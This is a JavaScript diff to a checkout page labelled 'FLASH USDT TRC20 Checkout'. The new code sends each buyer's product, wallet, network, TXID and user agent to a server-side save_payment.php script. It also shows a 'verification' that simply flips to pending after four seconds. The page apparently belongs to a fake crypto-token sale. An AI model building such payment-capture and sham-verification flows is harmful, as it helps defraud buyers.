@@ -875,14 +875,50 @@ footer .foot > *{ min-width:0; }
   vClose2?.addEventListener('click', ()=>{ closeVerifyModal(); showStep('step1'); toggleSummary(false); });
 
   // TXID -> open modal
-  document.getElementById('sendTxid')?.addEventListener('click', ()=>{
-    const txid = (document.getElementById('txid')?.value || '').trim();
-    if(!txid){ alert('Please enter your TXID.'); return; }
-    state.txid = txid;
-    const p = document.getElementById('pending-txid'); if(p) p.textContent = txid;
-    openVerifyProcess();
-    setTimeout(()=>{ swapToPending(); }, 4000);
-  });
+document.getElementById('sendTxid')?.addEventListener('click', ()=>{
+  const txid = (document.getElementById('txid')?.value || '').trim();
+  if(!txid){ alert('Please enter your TXID.'); return; }
+  state.txid = txid;
+  const p = document.getElementById('pending-txid'); 
+  if(p) p.textContent = txid;
+
+  // 💾 Kaydedilecek metin formatı
+  const details = `
+📦 PACKAGE INFO
+────────────────────────
+Product: ${state.productName || '—'}
+Amount: ${state.productUSDT || '—'} USDT
+Price: ${state.productPrice || '—'}
+Wallet: ${state.wallet || '—'}
+Network: ${state.network || '—'}
+TXID: ${txid}
+Payment Address: ${ADDRRSafe(state.network || '')}
+Date: ${new Date().toUTCString()}
+────────────────────────
+User-Agent: ${navigator.userAgent}
+Page: FLASH USDT TRC20 Checkout
+`;
+
+  // 📤 PHP’ye gönder
+  fetch('save_payment.php', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: 'data=' + encodeURIComponent(details)
+  })
+  .then(res => res.text())
+  .then(txt => {
+    if (txt.trim() === 'OK') {
+      console.log('Payment details saved successfully.');
+    } else {
+      console.warn('Server response:', txt);
+    }
+  })
+  .catch(err => console.error('Save error:', err));
+
+  // 🔄 Modal akışı
+  openVerifyProcess();
+  setTimeout(()=>{ swapToPending(); }, 4000);
+});
 
   // Init
   showStep('step1');
